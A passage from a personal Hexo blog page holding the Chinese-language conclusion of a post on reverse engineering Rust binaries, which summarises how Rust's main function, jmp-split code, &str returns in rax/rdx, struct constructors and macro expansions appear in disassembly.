<h2 id="0x04-总结"><a class="markdownIt-Anchor" href="#0x04-总结"></a> 0x04. 总结</h2>
<p>以上就是我们的第一次Rust逆向尝试，还是有很多收获的，下面是本文的总结：</p>
<ol>
<li>Rust的main函数与ELF中的main不同，但很好找。</li>
<li>Rust编译器喜欢将代码用<code>jmp</code>指令分割为一个个小部分。</li>
<li>对于返回<code>&amp;str</code>的方法，是将切片的指针和长度分别保存在<code>rax</code>和<code>rdx</code>之中。</li>
<li>对于<code>struct</code>的<code>new</code>方法，一般可在反汇编界面中直接识别，在汇编中实际执行的更像是通过<code>xxx.new(&amp;target)</code>的方式进行初始化。</li>
<li>Rust对宏展开的处理有一定的规律，可通过这些规律在反汇编界面中识别出宏展开的部分。</li>
</ol>
<p>不得不说，Rust编译器在汇编层面的处理还是有点意思的。在后面的文章中，我们将尝试分析更加复杂的代码，尝试整理出更多Rust语言特性在汇编层面中的实现方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">146</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">19:59</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
